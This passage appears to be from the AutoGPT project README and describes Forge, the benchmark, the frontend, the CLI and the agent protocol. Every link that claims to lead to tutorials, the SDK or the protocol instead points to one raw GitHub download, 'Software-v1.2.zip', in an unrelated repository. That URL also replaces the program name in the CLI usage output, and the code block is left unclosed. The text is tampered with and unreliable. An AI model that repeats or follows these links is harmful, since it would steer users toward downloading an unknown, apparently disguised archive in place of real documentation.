## 🧱 Building blocks

### 🏗️ Forge

**Forge your own agent!** &ndash; Forge is a ready-to-go template for your agent application. All the boilerplate code is already handled, letting you channel all your creativity into the things that set *your* agent apart. All tutorials are located [here](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip). Components from the [`https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip`](/autogpts/forge/forge/sdk) can also be used individually to speed up development and reduce boilerplate in your agent project.

🚀 [**Getting Started with Forge**](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip) &ndash;
This guide will walk you through the process of creating your own agent and using the benchmark and user interface.

### 🎯 Benchmark

**Measure your agent's performance!** The `agbenchmark` can be used with any agent that supports the agent protocol, and the integration with the project's [CLI] makes it even easier to use with AutoGPT and forge-based agents. The benchmark offers a stringent testing environment. Our framework allows for autonomous, objective performance evaluations, ensuring your agents are primed for real-world action.

### 💻 UI

**Makes agents easy to use!** The `frontend` gives you a user-friendly interface to control and monitor your agents. It connects to agents through the [agent protocol](#-agent-protocol), ensuring compatibility with many agents from both inside and outside of our ecosystem.

<!-- TODO: instert screenshot of front end -->

The frontend works out-of-the-box with all agents in the repo. Just use the [CLI] to run your agent of choice!

### ⌨️ CLI

[CLI]: #-cli

To make it as easy as possible to use all of the tools offered by the repository, a CLI is included at the root of the repo:

```shell
$ ./run
Usage: https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip [OPTIONS] COMMAND [ARGS]...

Options:
  --help  Show this message and exit.

Commands:
  agent      Commands to create, start and stop agents
  arena      Commands to enter the arena

### 🔄 Agent Protocol

To maintain a uniform standard and ensure seamless compatibility with many current and future applications, AutoGPT employs the [agent protocol](https://raw.githubusercontent.com/hongsedemaozi/kylegpt/master/benchmark/reports/babyagi/20230819T081418_full_run/Software-v1.2.zip) standard by the AI Engineer Foundation. This standardizes the communication pathways from your agent to the frontend and benchmark.
